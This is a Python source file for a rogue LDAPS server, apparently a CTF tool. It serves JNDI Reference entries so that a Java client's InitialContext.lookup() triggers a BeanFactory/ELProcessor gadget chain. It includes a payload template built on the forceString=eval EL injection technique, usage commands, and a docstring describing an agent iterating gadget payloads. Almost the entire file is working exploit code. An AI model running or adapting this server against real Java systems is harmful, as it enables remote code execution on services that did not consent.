#!/usr/bin/env python3
"""Rogue LDAPS server for authorized CTF JNDI / directory-integration
challenges. Serves a configurable JNDI Reference over implicit-TLS LDAP so the
target's InitialContext.lookup() deserializes a BeanFactory/ELProcessor gadget
chain.

Payload is re-read from a JSON file on EVERY search request, so the agent can
iterate gadget payloads through the sandbox's /workspace bind mount without
restarting the server:

  workspace/tsec/rogue-ldaps-payload.json
  {
    "javaClassName": "javax.el.ELProcessor",
    "javaFactory": "org.apache.naming.factory.BeanFactory",
    "javaCodeBase": "",
    "javaReferenceAddress": [
      "#0#forceString#x=eval",
      "#1#x#<EL payload>"
    ]
  }

Usage (privileged ports 389/636/1099/3268/3269 need root):
  sudo python3 tools/arena/rogue-ldaps.py --bind <operator-vpn-ip> --port 636 \
      --cert /tmp/rogue-ldaps-cert.pem --key /tmp/rogue-ldaps-key.pem

Self-signed cert (Java clients must trust-all for the handshake to complete;
challenge WAF made ldaps the only approved scheme, which implies trust-all):
  openssl req -x509 -newkey rsa:2048 -nodes -days 3 \
      -subj "/CN=rogue" -keyout /tmp/rogue-ldaps-key.pem -out /tmp/rogue-ldaps-cert.pem
"""

import argparse
import json
import os
import socket
import ssl
import struct
import sys
import threading

DEFAULT_PAYLOAD = {
    "javaClassName": "javax.el.ELProcessor",
    "javaFactory": "org.apache.naming.factory.BeanFactory",
    "javaCodeBase": "",
    "javaReferenceAddress": [
        "#0#forceString#x=eval",
        "#1#x#1/0",
    ],
}


# ------------------------------------------------------------------ BER codec
# Minimal LDAP BER: we only ever DECODE bind/search/unbind requests and ENCODE
# bindResponse / searchResEntry / searchResDone responses.

def ber_tlv_length(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(encoded)]) + encoded


def ber_wrap(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + ber_tlv_length(len(content)) + content


def ber_parse_tlv(data: bytes, offset: int):
    """Return (tag, value_bytes, next_offset) or None when the frame is short."""
    if offset + 2 > len(data):
        return None
    tag = data[offset]
    cursor = offset + 1
    first = data[cursor]
    cursor += 1
    if first < 0x80:
        length = first
    else:
        count = first & 0x7F
        if count == 0 or cursor + count > len(data):
            return None
        length = int.from_bytes(data[cursor:cursor + count], "big")
        cursor += count
    if cursor + length > len(data):
        return None
    return tag, data[cursor:cursor + length], cursor + length


def ber_children(content: bytes):
    children = []
    offset = 0
    while offset < len(content):
        parsed = ber_parse_tlv(content, offset)
        if parsed is None:
            break
        tag, value, offset = parsed
        children.append((tag, value))
    return children


# --------------------------------------------------------------- LDAP server

def encode_bind_response() -> bytes:
    # resultCode=success(0), matchedDN="", diagnostic=""
    body = ber_wrap(0x0A, b"\x00") + ber_wrap(0x04, b"") + ber_wrap(0x04, b"")
    return ber_wrap(0x61, body)


def encode_search_entry(object_name: bytes, attributes: dict) -> bytes:
    attr_list = b""
    for name, values in attributes.items():
        encoded = [value.encode("utf-8") if isinstance(value, str) else value for value in values]
        vals = b"".join(ber_wrap(0x04, value) for value in encoded)
        attr_list += ber_wrap(0x30, ber_wrap(0x04, name.encode()) + ber_wrap(0x31, vals))
    body = ber_wrap(0x04, object_name) + ber_wrap(0x30, attr_list)
    return ber_wrap(0x64, body)


def encode_search_done() -> bytes:
    body = ber_wrap(0x0A, b"\x00") + ber_wrap(0x04, b"") + ber_wrap(0x04, b"")
    return ber_wrap(0x65, body)


def load_payload(path: str) -> dict:
    try:
        with open(path, "r", encoding="utf-8") as handle:
            payload = json.load(handle)
        if not isinstance(payload, dict) or "javaFactory" not in payload:
            raise ValueError("payload must be an object with javaFactory")
        return payload
    except Exception as error:  # fall back to the built-in placeholder
        print(f"[rogue-ldaps] payload load failed ({error}); serving default", flush=True)
        return dict(DEFAULT_PAYLOAD)


def handle_connection(stream, address, args):
    print(f"[rogue-ldaps] connection from {address[0]}:{address[1]}", flush=True)
    buffer = b""
    try:
        while True:
            chunk = stream.recv(4096)
            if not chunk:
                break
            buffer += chunk
            while True:
                parsed = ber_parse_tlv(buffer, 0)
                if parsed is None:
                    break
                tag, value, consumed = parsed
                buffer = buffer[consumed:]
                children = ber_children(value)
                if len(children) < 2 or children[0][0] != 0x02:
                    continue  # not an LDAPMessage with messageID + protocolOp
                message_id = children[0][1]
                op_tag = children[1][0]
                if op_tag == 0x60:  # bindRequest
                    stream.sendall(ber_wrap(0x30, ber_wrap(0x02, message_id) + encode_bind_response()))
                elif op_tag == 0x63:  # searchRequest
                    # Echo the searched base DN as the entry's objectName: the
                    # JNDI provider matches the returned name against the DN it
                    # asked for.
                    search_children = ber_children(children[1][1])
                    base = next((v for t, v in search_children if t == 0x04), b"")
                    payload = load_payload(args.payload)
                    attributes = {"objectClass": ["javaNamingReference"]}
                    if payload.get("javaClassName"):
                        attributes["javaClassName"] = [payload["javaClassName"]]
                    attributes["javaFactory"] = [payload["javaFactory"]]
                    if payload.get("javaCodeBase"):
                        attributes["javaCodeBase"] = [payload["javaCodeBase"]]
                    for addr in payload.get("javaReferenceAddress", []):
                        attributes.setdefault("javaReferenceAddress", []).append(addr)
                    entry = encode_search_entry(base, attributes)
                    stream.sendall(ber_wrap(0x30, ber_wrap(0x02, message_id) + entry))
                    stream.sendall(ber_wrap(0x30, ber_wrap(0x02, message_id) + encode_search_done()))
                    print(f"[rogue-ldaps] served Reference for base={base!r} factory={payload['javaFactory']} "
                          f"addrs={len(payload.get('javaReferenceAddress', []))}", flush=True)
                elif op_tag == 0x42:  # unbindRequest
                    return
                # abandonRequest/extendedRequest and anything else: ignore
    except (ssl.SSLError, OSError) as error:
        print(f"[rogue-ldaps] {address[0]} error: {error}", flush=True)
    finally:
        try:
            stream.close()
        except OSError:
            pass


def main():
    parser = argparse.ArgumentParser(description="Rogue LDAPS JNDI Reference server (authorized CTF use)")
    parser.add_argument("--bind", default="0.0.0.0", help="bind address (default 0.0.0.0)")
    parser.add_argument("--port", type=int, default=636, help="LDAPS port (default 636)")
    parser.add_argument("--cert", required=True, help="TLS certificate PEM")
    parser.add_argument("--key", required=True, help="TLS private key PEM")
    parser.add_argument("--payload", default=os.path.join("workspace", "tsec", "rogue-ldaps-payload.json"),
                        help="JSON payload file, re-read on every search")
    args = parser.parse_args()

    if not (os.path.exists(args.cert) and os.path.exists(args.key)):
        sys.exit("cert/key not found — generate with:\n"
                 "  openssl req -x509 -newkey rsa:2048 -nodes -days 3 -subj /CN=rogue "
                 f"-keyout {args.key} -out {args.cert}")

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(args.cert, args.key)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.bind, args.port))
    listener.listen(16)
    print(f"[rogue-ldaps] listening on ldaps://{args.bind}:{args.port} payload={args.payload}", flush=True)

    while True:
        raw, address = listener.accept()
        try:
            stream = context.wrap_socket(raw, server_side=True)
        except (ssl.SSLError, OSError) as error:
            print(f"[rogue-ldaps] TLS handshake failed from {address[0]}: {error}", flush=True)
            continue
        threading.Thread(target=handle_connection, args=(stream, address, args), daemon=True).start()


if __name__ == "__main__":
    main()
